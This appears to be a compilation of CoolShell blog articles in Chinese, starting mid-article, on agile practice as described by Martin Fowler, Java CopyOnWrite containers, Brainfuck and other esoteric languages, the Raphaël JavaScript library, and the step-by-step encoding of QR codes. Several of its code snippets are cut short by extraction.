Usual）是指使公司业务正常运营而进行的一些日常业务活动，对于IT部门而言则包括系统维护、技术支持以及应用更改。这些工作相对于独立的软件项目而言即琐碎又零散，但又是不可或缺的。“如何在常规业务中应用敏捷方法？”，这是我们向Martin提出的第一个问题。Martin阐述道，首先需要澄清一下对项目的定义，传统的项目运作方式是集中一批业务人员、开发人员和管理人员进行产品开发，开发完成后将产品交付系统运行和支持部门，项目也就随之结束了。在敏捷方法中，项目是一个持续性的过程，系统随着业务的需要不断地更改和重构，参与项目的人员也相应地在不断地增加或者减少。笔者的理解是只要系统仍在支持业务运营，项目就不会结束，因为业务几乎不可能不变更，并且必要的重构也不可避免，对于ThoughtWorks的顾问们来说这意味着他们和客户的业务关系也不会结束，呵呵，双赢的策略！
**2、集中式办公和分布式办公**Martin强烈反对项目成员分散式办公，甚至觉得如果你需要业务人员每天到你的办公室来访问你，那简直是不可接受的，至少你应该每天都去拜访他们。“It is a shame if the business stakeholders need to come to your office every day”大意如此。但是现实却是，对于很多公司而言，将业务经理、项目经理、业务分析人员、开发人员和测试人员都集中在一个办公室简直就是一件不可能完成的任务。笔者目前所在的项目有三个团队，一个在悉尼，两个在墨尔本，每周进行四次远程视频会议，同时通过使用电话、即时消息系统、电子邮件、项目WiKi系统等手段来解决分布办公带来的沟通不及时和信息不透明等问题。Martin最后也不得不承认，很多时候如果实在不能够做到集中式办公，那只有准备好为此付出一定的成本。笔者认为要做到完全的集中式办公可能不太现实，不过可以尽可能在异地团队之间保持相关业务的对等沟通，比如在各个团队中都尽可能安排项目相关的各类角色，如：业务经理、项目经理、开发人员等，让这些人员与在异地的相同职能的人员沟通，然后再将信息在各自的团队内消化和共享，这样的效果也许会好于纯粹的按照职能来分布团队。
**3、交叉技能（Cross Skills）**这里主要讲的是BA（Business Analyst 业务分析人员）和QA（Quality Assurance 质量保证人员或测试人员），Martin说在理想的情况下，BA和QA的角色可以合并，开发人员和QA的角色也可以互换。因为BA和QA都需要对系统功能有很清晰全面的了解，他们也是系统测试的主要参与者和鉴定者，他们用来定义系统功能的主要文档是用户故事（Story），而用来测试系统功能的则是功能测试代码，测试人员和开发人员有责任将功能测试代码写得易于阅读，特别是对于BA，如果他们能够象阅读用户故事一样阅读功能测试代码，将会提高他们测试系统的效率和兴趣。这也是在功能测试中使用领域特定语言（Domain Specific Language）的目的，如果BA和QA都能够阅读和使用DSL编写测试代码，那该多好啊！（憧憬中…） 通过让开发人员轮换地担任QA的角色，可以帮助提高测试代码的质量，也可以让开发人员真正从用户的角度来考虑系统功能的设计，还可以建立相互信任、相互尊重（appreciate each others work）的良好氛围。**4、设计和编码**
一位同事谈到对业务模型缺乏了解会导致代码难于理解，有时候即使代码的质量过关并且系统功能都在正常工作，但是系统的设计却和业务模型出现很大的偏差。“ 在实现设计之前，开发人员需要正确理解整个业务模型（The big picture）”，这是被经常提及的解决方法之一。Martin对此却不置可否，当然能够理解整个业务模型是最理想的情况，但是往往很少有人能够做到这一点，即便能够做到，业务模型也会随着时间和具体情况而变更。Martin首先认为设计和编码不是两个分离的过程，开发人员在设计过程中编码，也在编码过程中设计。开发人员在编码的过程中实现自己当前对业务模型的了解，首先让功能模块工作起来（Get it working），同时考虑如何让代码更便于日后的必要的重构，随着时间的推移，开发人员对业务模型的了解会不断清晰和全面，只要代码易于重构，整个系统的设计和实现将会不断地、最终地符合业务模型。**5、公司内部的开源项目，鼓励用户参与产品开发**很多公司里不同的IT部门可能会重复开发相同功能的产品，这样会导致很大的资源浪费，用户也会面临选择的难题。再者，Martin发现很多IT部门对用户提出的功能需求缺乏足够快的响应速度，主要原因是开发人员资源有限，即使再玩命地工作也不可能在用户的预期时间内处理完本来就很长的功能需求队列。典型的例子是：公司有两个IT部门A和B，A部门需要B部门对邮政编码的Web Service做一个功能更改，而B部门的开发人员正忙于处理n个之前提交的功能需求，所以A部门的需求只能在队列中耐心等待直到B部门有开发人员空闲。如何缩短用户的等待时间？Martin建议如果A部门有开发人员熟悉Web Services，他可以从B部门的源代码库中提取邮政编码Web Service的代码，并且编码实现他需要的功能，完成之后生成代码包提交给B部门审核和测试，通过后就可以将代码合并到代码库中。这样做的优点是：1. 将功能需求由开发部门驱动转变为用户驱动，因为用户是真正了解并需要这个功能的人，所以用户会更为迫切地运用各种手段实现该功能，同时保证功能如其预期的那样运行。 2. 缩短开发周期，如果用户不愿意等待的话他可以立即着手开始功能的实现，而不必等待B部门的人员。3. 有利于公司内部的知识共享和交流，即便A部门的开发人员不熟悉Web Services但是愿意学习，B部门的开发人员可以通过结对编程（Pair Programming）的方法指导对方，待对方上手之后即可返回自己的工作，相对于B部门开发人员由始至终开发整个功能而言，这仍然可以大大缩短整个开发周期。当然，公司内部的开源策略需要一些前提，首先是部门之间应该有共同的知识领域，代码和文档需要版本控制的支持，部门人员能够理解和运用结对编程。
**6、选择和运用框架**“It is like you buying a new PC every 2 years” 当Martin被问道“这么多的应用框架层出不穷，我们该如何选择？”的时候如是回答。每几年我们都会换一台新电脑，是因为新的电脑内存更大，处理速度更快，应用软件也更复杂，要求的系统资源也更多。我们使用框架的目的也是解决业务相关的问题，只要是对业务有利的框架，都值得花一点时间去关注。 Martin鼓励公司允许开发人员占用一定的工作时间来实验新的框架，因为不这样如何能够知道它是否对提升业务价值有帮助。当然框架在生产环境（Production Environment）中的表现是衡量的一个重要标准，因为不经过生产环境中各种复杂情况的检验，很难最终确定框架是否适用。**（ **本文系作者原创，请勿用于商业用途** ，如转载请注明出自酷壳www.cocre.com）**# Java中的CopyOnWrite容器作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**感谢清英 同学的投稿**Copy-On- Write简称COW，是一种用于程序设计中的优化策略。其基本思路是，从一开始大家都在共享同一个内容，当某个人想要修改这个内容的时候，才会真正把内容Copy出去形成一个新的内容然后再改，这是一种延时懒惰策略。从JDK1.5开始Java并发包里提供了两个使用CopyOnWrite机制实现的并发容器,它们是CopyOnWriteArrayList和CopyOnWriteArraySet。CopyOnWrite容器非常有用，可以在非常多的并发场景中使用到。
目录* 什么是CopyOnWrite容器   * CopyOnWriteArrayList的实现原理   * CopyOnWrite的应用场景   * CopyOnWrite的缺点#### 什么是CopyOnWrite容器CopyOnWrite容器即写时复制的容器。通俗的理解是当我们往一个容器添加元素的时候，不直接往当前容器添加，而是先将当前容器进行Copy，复制出一个新的容器，然后新的容器里添加元素，添加完元素之后，再将原容器的引用指向新的容器。这样做的好处是我们可以对CopyOnWrite容器进行并发的读，而不需要加锁，因为当前容器不会添加任何元素。所以CopyOnWrite容器也是一种读写分离的思想，读和写不同的容器。#### CopyOnWriteArrayList的实现原理在使用CopyOnWriteArrayList之前，我们先阅读其源码了解下它是如何实现的。以下代码是向ArrayList里添加元素，可以发现在添加的时候是需要加锁的，否则多线程写的时候会Copy出N个副本出来。Object[] elements = getArray();int len = elements.length;     // 复制出新数组
Object[] newElements = Arrays.copyOf(elements, len + 1);     // 把新元素添加到新数组里newElements[len] = e;     // 把原数组引用指向新数组setArray(newElements);return true;lock.unlock();}}读的时候不需要加锁，如果读的时候有多个线程正在向ArrayList添加数据，读还是会读到旧的数据，因为写的时候不会锁住旧的ArrayList。JDK中并没有提供CopyOnWriteMap，我们可以参考CopyOnWriteArrayList来实现一个，基本代码如下：import java.util.Collection;     import java.util.Map;     import java.util.Set;实现很简单，只要了解了CopyOnWrite机制，我们可以实现各种CopyOnWrite容器，并且在不同的应用场景中使用。#### CopyOnWrite的应用场景CopyOnWrite并发容器用于读多写少的并发场景。比如白名单，黑名单，商品类目的访问和更新场景，假如我们有一个搜索网站，用户在这个网站的搜索框中，输入关键字搜索内容，但是某些关键字不允许被搜索。这些不能被搜索的关键字会被放在一个黑名单当中，黑名单每天晚上更新一次。当用户搜索时，会检查当前关键字在不在黑名单当中，如果在，则提示不能搜索。实现代码如下：
package com.ifeve.book;import java.util.Map;import com.ifeve.book.forkjoin.CopyOnWriteMap;/**     * 黑名单服务     *     * @author fangtengfei     *     */     public class BlackListServiceImpl {private static CopyOnWriteMap<String, Boolean> blackListMap = new CopyOnWriteMap<String, Boolean>(     1000);/**     * 批量添加黑名单     *     * @param ids     */     public static void addBlackList(Map<String,Boolean> ids) {     blackListMap.putAll(ids);     }}代码很简单，但是使用CopyOnWriteMap需要注意两件事情：1\. 减少扩容开销。根据实际需要，初始化CopyOnWriteMap的大小，避免写时CopyOnWriteMap扩容的开销。
2\. 使用批量添加。因为每次添加，容器每次都会进行复制，所以减少添加次数，可以减少容器的复制次数。如使用上面代码里的addBlackList方法。#### CopyOnWrite的缺点CopyOnWrite容器有很多优点，但是同时也存在两个问题，即内存占用问题和数据一致性问题。所以在开发的时候需要注意一下。**内存占用问题** 。因为CopyOnWrite的写时复制机制，所以在进行写操作的时候，内存里会同时驻扎两个对象的内存，旧的对象和新写入的对象（注意:在复制的时候只是复制容器里的引用，只是在写的时候会创建新对象添加到新容器里，而旧容器的对象还在使用，所以有两份对象内存）。如果这些对象占用的内存比较大，比如说200M左右，那么再写入100M数据进去，内存就会占用300M，那么这个时候很有可能造成频繁的Yong GC和Full GC。之前我们系统中使用了一个服务由于每晚使用CopyOnWrite机制更新大对象，造成了每晚15秒的Full GC，应用响应时间也随之变长。针对内存占用问题，可以通过压缩容器中的元素的方法来减少大对象的内存消耗，比如，如果元素全是10进制的数字，可以考虑把它压缩成36进制或64进制。或者不使用CopyOnWrite容器，而使用其他的并发容器，如ConcurrentHashMap。
**数据一致性问题** 。CopyOnWrite容器只能保证数据的最终一致性，不能保证数据的实时一致性。所以如果你希望写入的的数据，马上能读到，请不要使用CopyOnWrite容器。关于C++的STL中，曾经也有过Copy-On-Write的玩法，参见陈皓的《C++ STL String类中的Copy-On- Write》，后来，因为有很多线程安全上的事，就被去掉了。（全文完）# BT雷人的程序语言作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这个世界从来都不会缺少另类的东西，人类自然世界如此，计算机世界也一样。编程语言方面，看过本站《6个变态的C语言Hello World程序》的朋友们一定对BT和另类不会陌生，但那都是些小儿科，真正的BT和另类要是从语言级上来完成。让我们来看看其中一个比较另类的语言BrainFuck。看到这个程序语言的名字，请不要以为这是一个搞笑的语言，这是一个“严肃事情”，请大家用“最虔诚的态度”来阅读本文。目录* BF语言介绍   * BF解释器   * Hello World   * 其它另类语言#### BF语言介绍
**Brainfuck** ，是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于“绿王八”的原因，这种语言有时被称为 **brainf**k** 或 **brainf***** ，甚至被简称为 **BF** 。这种 语言，是一种按照“Turing complete（完整图灵机）”思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号的组合来完成。BF基于一个简单的机器模型，除了八个指令，这个机器还包括：一个以字节为单位、被初始化为零的数组、一个指向该数组的指针(初始时指向数组的第一个字节)、以及用于输入输出的两个字节流。下面是这八种指令的描述，其中每个指令由一个字符标识：字符 | 含义   ---|---   `>` | 指针加一   `<` | 指针减一   `+` | 指针指向的字节的值加一   `-` | 指针指向的字节的值减一   `.` | 输出指针指向的单元内容（ASCII码）   `,` | 输入内容到指针指向的单元（ASCII码）   `[` | 如果指针指向的单元值为零，向后跳转到对应的`]`指令的次一指令处   `]` | 如果指针指向的单元值不为零，向前跳转到对应的`[`指令的次一指令处
（按照更节省时间的简单说法，`]`也可以说成“向后跳转到对应的`[`状态”。这两解释是一样的。）（第三种同价的说法，`[`意思是”向前跳转到对应的`]`“，`]`意思是”向后跳转到对应的`[`指令的次一指令处，如果指针指向的字节非零。”）Brainfuck程序可以用下面的替换方法翻译成C语言（假设`ptr`是`char*`类型）：#### BF解释器因为 BrainFuck 只有八种指令，并且没有关键字，也不允许自定义标识符，因此它的编译器实现起来非常简单，初学 C 语言不久的人都可以自己编出来，尽管在座的各位每人都可以自己编一个，不过为了引起大家的兴趣，我这里还是给出大家一个官方发布的版本。这个程序只有短短 50 多行，并且完全由 ANSI C 写成，因此你随便找个 C 语言编译器，把它编译一下。int  p, r, q;     char a[5000], f[5000], b, o, *s=f;q=argc;当然，如果你觉得用C语言来实现BrainFuck语言的解释器是对BrainFuck这种语言的一种侮辱的话，我们的BrainFuck社区是绝对不能容忍你有这种想法的。因为我们有一个使用100%纯brainfuck写成的一个编译器 **awib** ：http://code.google.com/p/awib/
#### Hello World++++++++++[>+++++++>++++++++++>+++>+<<<<-]     >++.>+.+++++++..+++.>++.<<+++++++++++++++.     >.+++.------.--------.>+.>.怎么？看不懂吗？下面是解释：+++ +++ +++ +           initialize counter (cell #0) to 10     [                       use loop to set the next four cells to 70/100/30/10     > +++ +++ +             add  7 to cell #1     > +++ +++ +++ +         add 10 to cell #2     > +++                   add  3 to cell #3     > +                     add  1 to cell #4     <<< < -                 decrement counter (cell #0)     ]     >++ .                   print 'H'     >+.                     print 'e'     +++ +++ +.              print 'l'     .                       print 'l'     +++ .                   print 'o'     >++ .                   print ' '     <<+ +++ +++ +++ +++ ++. print 'W'     >.                      print 'o'     +++ .                   print 'r'     --- --- .               print 'l'     --- --- --.             print 'd'     >+.                     print '!'     >.                      print '\n'
**相关链接** ：* BF的官网：。   * BF的Wikipedia：http://en.wikipedia.org/wiki/Brainfuck。#### 其它另类语言如果你要觉得BF已经很BT了，那么你就错了，下面这些程序语言更BT。**WhiteSpace语言**这是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统为注释。下面是它的一个示例：什么？你什么也没有看见，这就对了，因为这正是这门语言的独特之处。访问下面这个链接查看Hello,World示例。记得按Ctrl+A来查看程序。官网：。**LOLCODE语言**LOLCODE是一种建立在高度缩写的网络英语之上的编程语言，一般来说如果一个人能理解这种网络英语就能在未经训练的情况下读懂LOLCODE程序源代码。下面是其Hello,World例程：HAI     CAN HAS STDIO?     VISIBLE "HAI WORLD!"     KTHXBYE翻译成中文就是：嗨     我可以用 STDIO 么？     显示一下 “HAI WORLD!”     谢谢啊，再见官网：**中文编程语言**不要以为只有老外才那么BT，咱们中国也有自己的BT编程语言。
**中文Basic**中文指令 |  | 对应于的Applesoft BASIC   ---|---|---   `10 卜=0` |  | `10 Y=0`   `20 入 水, 火` |  | `20 INPUT E, F`   `30 從 日 = 水 到 火` |  | `30 FOR A = E TO F`   `40 卜 = 卜+對數(日)` |  | `40 Y = Y + LOG (A)`   `50 下一 日` |  | `50 NEXT A`   `60 印 卜` |  | `60 PRINT Y`官网无法访问了，只能看看Wikipedia了：http://en.wikipedia.org/wiki/Chinese_BASIC**中蟒语言（中文Python）**下面的程序是不是很Cool？#!/usr/local/bin/cpython     回答 = 读入('你认为中文程式语言有存在价值吗 ? (有/没有)')     如 回答 == '有':     写 '好吧, 让我们一起努力!'     不然 回答 == '没有':     写 '好吧,中文并没有作为程式语言的价值.'     否则:     写 '请认真考虑后再回答.'
官网：http://www.chinesepython.org/差不多了，该结束了，再次说明，这是一篇很严肃的文章。( **全文完** )# Javascript向量图Lib–Raphaël作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我们知道很多的Javascript的lib库了，比如：jQuery，YUI，Ext JS等等。今天看到一个很牛X的lib叫Raphaël [ˈrafēəl]，这是一个很小的JavaScript library，可以让在你的Web上整一些向量图，并且可以完成一些动画和图形变化，很强大。Raphaël使用的是 W3C 推荐的 SVG和VML 来创建图片。这意味着所创建的图形对象一样可以是一个DOM对象，可以被你的Javascript的事件来操作。Raphaël 支持所有的主流浏览器：Firefox 3.0+, Safari 3.0+, Chrome 5.0+, Opera 9.5+ d 和 Internet Explorer 6.0+，最强大的是，这个js文件被压缩后也就60K。下面，让我们来看几个示例：下面是一个图形变化的示例，点击两个图形间的箭头。
下面是一个流程图，你用鼠标拖动一下其中的图形：下面是一个时钟：下面是一个3D迷宫（用方向键移动，空格键跳动，注意左上角的地图）：更多的示例请到其网站上看看吧：*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 为什么敏捷方法能在软件开发中行之有效？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn_文章来源 – Martin Fowler 和 Neal Ford 在 Paris – USI 2010 的演讲_有很多的书籍讨论敏捷方法是怎样工作的（How it works？），在这个主题演讲中，Martin Fowler 和他的同事 Neal Ford 讨论了敏捷方法能够在软件开发项目中行之有效的原因（Why it works？）。作为敏捷方法的发起人和传道者，Martin Fowler 和 ThoughtWorks 一直试图从理论层面证明敏捷方法的可行性，同时不厌其烦地解答着客户们的各种困惑，正如他们所说，敏捷方法中的很多概念不是特别的直观，除非人们真正实践过一段时间，否则有些概念很难从字面上去完全理解。
Martin Fowler 谈到一个有意思的现象，那就是今天许多人们口中谈论的敏捷方法，和最初的敏捷方法大相径庭，他把这种现象称为“语义扩散（Semantic Diffusion）”，大意是某种思想在传播的过程中，在逐渐扩散的同时，其语义也渐渐变得模糊。在敏捷开发领域里，“语义扩散”导致的一个问题是，在一些使用敏捷方法的项目或者公司中，我们甚至无法辨别出敏捷方法的影子，原因是很多人没有真正地理解敏捷方法，也就不能够正确地运用和实践，从而也就无法真正了解自己是否能够从敏捷方法中获益。以下是为什么敏捷方法行之有效的原因：#### **1\. 敏捷方法和传统的计划驱动方法的两个主要区别**i. 预测性计划（Predictive Planning）和自适应计划（Adaptive Planning）计划驱动方法首先计划要做的工作（plan your work），然后着手工作以完成计划（work your plan）。这是一种带有预测性质的方法，其衡量项目成功的标准则是我们是否按计划、按时、按预算完成了工作。这种方法在很多领域里是适用的。但是对于软件开发而言，如果我们的需求没有办法做到不变更的话，我们就无法保证我们的计划以及其后的工作是不会变更的。Martin Fowler 向现场观众提出了一个问题，大意是你们当中有多少人的软件开发项目的需求是一成不变的，结果没有一位观众举手。因此，敏捷方法引入了自适应计划的概念，既然我们无法保证需求不变更，那么就让我们随时准备接受变更，接受挑战吧。自适应计划将计划驱动的流程缩短为以数周为单位的循环周期，在每一个周期中，我们根据当前的情况不断地调整计划以及计划的执行过程，同时不断地产生能够工作的代码，并且不断地将代码部署到应用环境中去。当然要实现这个目标我们需要一些具体方法的支持，如：自测试代码（Self- Testing Code），持续集成（Continuous Integration），重构（Refactoring），和简洁设计（Simple Design）等等这些技术层面上的方法。Martin Fowler 指出，一些公司和项目之所以受困于敏捷方法，原因之一是他们忽略了这些技术层面的方法，而仅仅实施了项目管理层面的方法。
ii. 以流程为本（Process First）和以人为本（People First）在传统的方法论中，我们总是需要事先定义好工作的方法和流程，然后“工人们”被要求遵照这些方法和流程来工作。在软件开发领域，很多人把软件开发过程等同于软件本身，也就是说，软件开发的过程也如同软件程序般象机器一样运行，组件之间环环相扣，严密地协同工作。问题是软件开发的核心是人，人相对于机器零件和流水线而言，是相对不可预测的和不那么精密的。所以敏捷方法反其道而行之，提倡将“首先定义流程，然后要求软件开发人员遵照流程工作”变为“让参与软件开发的人员自己来定义和选择适合他们的流程”。简单来说就是以人为本，不把人当螺丝钉，发挥人的主观能动性，当然前提是需要团队成员有较高的平均素质。#### 2\. 沟通（Communication）Neal Ford 让我们回顾或想象一下失败的软件开发项目，它们的失败是由于技术因素还是人的因素呢？《人件》的作者认为都是人的因素。人类的社会性决定了沟通的重要。Neal 举了几个有趣的例子，如：监狱里的犯人宁愿和其他人渣待在一起也不愿被关禁闭。很多国家禁止驾驶员驾驶时打移动电话，那为什么和乘客聊天就没有问题呢？原因是直接对话是最为有效和便捷的沟通方式，信息的传递在对话过程中非常顺畅和完整。虽然现在的移动通讯已经非常先进，信号质量也很高，但是我们的通话过程仍然是有损的，我们的大脑这个时候就需要努力地试图将通话信息拼凑得更完整以便能够理解对方的意思，因此才会分散驾驶的注意力。随后，Martin Fowler 举了另一个例子，拿他做水果蛋糕的方法和他在酒店的浴室中冲凉的方法来进行比较。因为做水果蛋糕的整个流程和配料都是非常固定的，所以他只需要按步照搬地烹饪即可做出味道非常一致（地好或者差）的水果蛋糕。而在酒店中冲凉就有些不同，因为每一个酒店浴室的开关设计几乎都是不一样的，所以他需要不断地调整开关来获得一个理想的水温，也就是需要不断地重复“调整开关”（输入），“用手试温”（输出）这个过程。相对于做水果蛋糕，在酒店浴室冲凉更好地反应了软件开发的特征，这就是在软件开发领域中，如果我们善于根据用户反馈的信息来做出新的判断和调整，就有可能提高产品的质量和用户的满意度。
沟通的确是一个非常重要的环节，它是敏捷方法的核心。在敏捷方法中，单元测试是程序员和代码组件的沟通，功能测试是程序员以及QA和系统的沟通，故事墙（Story Wall）和回顾（Retrospective）是团队和成员之间的沟通，功能演示（Showcase 或者 Demo）是团队通过产品和最终用户的沟通，持续集成（Continuous Integration）是产品和企业计算环境的沟通。沟通好了，什么事情都可以妥善解决，沟通得不好，好事也会变坏事。和广大技术爱好者交流沟通也是酷壳存在的目的和意义。整个演讲时长一个小时，本文只是节选了我认为比较有意思的观点加上本人的理解写成，如有错误之处欢迎指正，不同看法欢迎交流。# 二维码的生成细节和原理作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn二维码又称QR Code，QR全称Quick Response，是一个近几年来移动设备上超流行的一种编码方式，它比传统的Bar Code条形码能存更多的信息，也能表示更多的数据类型：比如：字符，数字，日文，中文等等。这两天学习了一下二维码图片生成的相关细节，觉得这个玩意就是一个密码算法，在此写一这篇文章 ，揭露一下。供好学的人一同学习之。
关于QR Code Specification，可参看这个PDF：http://raidenii.net/files/datasheets/misc/qr_code.pdf目录* 基础知识     * 定位图案     * 功能性数据     * 数据码和纠错码   * 数据编码     * 示例一：数字编码     * 示例二：字符编码   * 结束符和补齐符     * 按8bits重排     * 补齐码（Padding Bytes）   * 纠错码   * 最终编码     * 穿插放置     * Remainder Bits   * 画二维码图     * Position Detection Pattern     * Alignment Pattern     * Timing Pattern     * Format Information     * Version Information     * 数据和数据纠错码     * 掩码图案#### 基础知识首先，我们先说一下二维码一共有40个尺寸。官方叫版本Version。Version 1是21 x 21的矩阵，Version 2是 25 x 25的矩阵，Version 3是29的尺寸，每增加一个version，就会增加4的尺寸，公式是：(V-1)*4 + 21（V是版本号） 最高Version 40，(40-1)*4+21 = 177，所以最高是177 x 177 的正方形。
下面我们看看一个二维码的样例：##### 定位图案* Position Detection Pattern是定位图案，用于标记二维码的矩形大小。这三个定位图案有白边叫Separators for Postion Detection Patterns。之所以三个而不是四个意思就是三个就可以标识一个矩形了。* Timing Patterns也是用于定位的。原因是二维码有40种尺寸，尺寸过大了后需要有根标准线，不然扫描的时候可能会扫歪了。* Alignment Patterns 只有Version 2以上（包括Version2）的二维码需要这个东东，同样是为了定位用的。##### 功能性数据* Format Information 存在于所有的尺寸中，用于存放一些格式化数据的。* Version Information 在 >= Version 7以上，需要预留两块3 x 6的区域存放一些版本信息。##### 数据码和纠错码* 除了上述的那些地方，剩下的地方存放 Data Code 数据码 和 Error Correction Code 纠错码。#### 数据编码我们先来说说数据编码。QR码支持如下的编码：
**Numeric mode** 数字编码，从0到9。如果需要编码的数字的个数不是3的倍数，那么，最后剩下的1或2位数会被转成4或7bits，则其它的每3位数字会被编成 10，12，14bits，编成多长还要看二维码的尺寸（下面有一个表Table 3说明了这点）**Alphanumeric mode** 字符编码。包括 0-9，大写的A到Z（没有小写），以及符号$ % * + – . / : 包括空格。这些字符会映射成一个字符索引表。如下所示：（其中的SP是空格，Char是字符，Value是其索引值） 编码的过程是把字符两两分组，然后转成下表的45进制，然后转成11bits的二进制，如果最后有一个落单的，那就转成6bits的二进制。而编码模式和字符的个数需要根据不同的Version尺寸编成9, 11或13个二进制（如下表中Table 3）**Byte mode** , 字节编码，可以是0-255的ISO-8859-1字符。有些二维码的扫描器可以自动检测是否是UTF-8的编码。**Kanji mode** 这是日文编码，也是双字节编码。同样，也可以用于中文编码。日文和汉字的编码会减去一个值。如：在0X8140 to 0X9FFC中的字符会减去8140，在0XE040到0XEBBF中的字符要减去0XC140，然后把结果前两个16进制位拿出来乘以0XC0，然后再加上后两个16进制位，最后转成13bit的编码。如下图示例：
**Extended Channel Interpretation (ECI) mode** 主要用于特殊的字符集。并不是所有的扫描器都支持这种编码。**Structured Append mode** 用于混合编码，也就是说，这个二维码中包含了多种编码格式。**FNC1 mode** 这种编码方式主要是给一些特殊的工业或行业用的。比如GS1条形码之类的。简单起见，后面三种不会在本文 中讨论。下面两张表中，* Table 2 是各个编码格式的“编号”，这个东西要写在Format Information中。注：中文是1101* Table 3 表示了，不同版本（尺寸）的二维码，对于，数字，字符，字节和Kanji模式下，对于单个编码的2进制的位数。（在二维码的规格说明书中，有各种各样的编码规范表，后面还会提到）下面我们看几个示例，##### 示例一：数字编码在Version 1的尺寸下，纠错级别为H的情况下，编码： 012345671\. 把上述数字分成三组: 012 345 672\. 把他们转成二进制: 012 转成 0000001100； 345 转成 0101011001； 67 转成 1000011。
3\. 把这三个二进制串起来: 0000001100 0101011001 10000114\. 把数字的个数转成二进制 (version 1-H是10 bits ): 8个数字的二进制是 00000010005\. 把数字编码的标志0001和第4步的编码加到前面: 0001 0000001000 0000001100 0101011001 1000011##### 示例二：字符编码在Version 1的尺寸下，纠错级别为H的情况下，编码: AC-421\. 从字符索引表中找到 AC-42 这五个字条的索引 (10,12,41,4,2)2\. 两两分组: (10,12) (41,4) (2)3.把每一组转成11bits的二进制:(10,12) 10*45+12 等于 462 转成 00111001110   (41,4) 41*45+4 等于 1849 转成 11100111001   (2) 等于 2 转成 0000104\. 把这些二进制连接起来：00111001110 11100111001 0000105\. 把字符的个数转成二进制 (Version 1-H为9 bits ): 5个字符，5转成 000000101
6\. 在头上加上编码标识 0010 和第5步的个数编码: 0010 000000101 00111001110 11100111001 000010#### 结束符和补齐符假如我们有个HELLO WORLD的字符串要编码，根据上面的示例二，我们可以得到下面的编码，编码 | 字符数 | HELLO WORLD的编码   ---|---|---   0010 | 000001011 | 01100001011 01111000110 10001011100 10110111000 10011010100 001101我们还要加上结束符：编码 | 字符数 | HELLO WORLD的编码 | 结束   ---|---|---|---   0010 | 000001011 | 01100001011 01111000110 10001011100 10110111000 10011010100 001101 | 0000##### 按8bits重排如果所有的编码加起来不是8个倍数我们还要在后面加上足够的0，比如上面一共有78个bits，所以，我们还要加上2个0，然后按8个bits分好组：00100000 01011011 00001011 01111000 11010001 01110010 11011100 01001101 01000011 010000 **00**
##### 补齐码（Padding Bytes）最后，如果如果还没有达到我们最大的bits数的限制，我们还要加一些补齐码（Padding Bytes），Padding Bytes就是重复下面的两个bytes：11101100 00010001 （这两个二进制转成十进制是236和17，我也不知道为什么，只知道Spec上是这么写的）关于每一个Version的每一种纠错级别的最大Bits限制，可以参看QR Code Spec的第28页到32页的Table-7一表。假设我们需要编码的是Version 1的Q纠错级，那么，其最大需要104个bits，而我们上面只有80个bits，所以，还需要补24个bits，也就是需要3个Padding Bytes，我们就添加三个，于是得到下面的编码：00100000 01011011 00001011 01111000 11010001 01110010 11011100 01001101 01000011 01000000 **11101100 00010001 11101100**上面的编码就是数据码了，叫Data Codewords，每一个8bits叫一个codeword，我们还要对这些数据码加上纠错信息。
#### 纠错码上面我们说到了一些纠错级别，Error Correction Code Level，二维码中有四种级别的纠错，这就是为什么二维码有残缺还能扫出来，也就是为什么有人在二维码的中心位置加入图标。错误修正容量   ---   L水平 | 7%的字码可被修正   M水平 | 15%的字码可被修正   Q水平 | 25%的字码可被修正   H水平 | 30%的字码可被修正那么，QR是怎么对数据码加上纠错码的？首先，我们需要对数据码进行分组，也就是分成不同的Block，然后对各个Block进行纠错编码，对于如何分组，我们可以查看QR Code Spec的第33页到44页的Table-13到Table-22的定义表。注意最后两列：* **Number of Error Code Correction Blocks** ：需要分多少个块。* **Error Correction Code Per Blocks** ：每一个块中的code个数，所谓的code的个数，也就是有多少个8bits的字节。举个例子：上述的Version 5 + Q纠错级：需要4个Blocks（2个Blocks为一组，共两组），头一组的两个Blocks中各15个bits数据 + 各 9个bits的纠错码（注：表中的codewords就是一个8bits的byte）（再注：最后一例中的（c, k, r ）的公式为：c = k + 2 * r，因为后脚注解释了：纠错码的容量小于纠错码的一半）
下图给一个5-Q的示例（因为二进制写起来会让表格太大，所以，我都用了十进制，我们可以看到每一块的纠错码有18个codewords，也就是18个8bits的二进制数）组 | 块 | 数据 | 对每个块的纠错码   ---|---|---|---   1 | 1 | 67 85 70 134 87 38 85 194 119 50 6 18 6 103 38 | 213 199 11 45 115 247 241 223 229 248 154 117 154 111 86 161 111 39   2 | 246 246 66 7 118 134 242 7 38 86 22 198 199 146 6 | 87 204 96 60 202 182 124 157 200 134 27 129 209 17 163 163 120 133   2 | 1 | 182 230 247 119 50 7 118 134 87 38 82 6 134 151 50 7 | 148 116 177 212 76 133 75 242 238 76 195 230 189 10 108 240 192 141   2 | 70 247 118 86 194 6 151 50 16 236 17 236 17 236 17 236 | 235 159 5 173 24 147 59 33 106 40 255 172 82 2 131 32 178 236
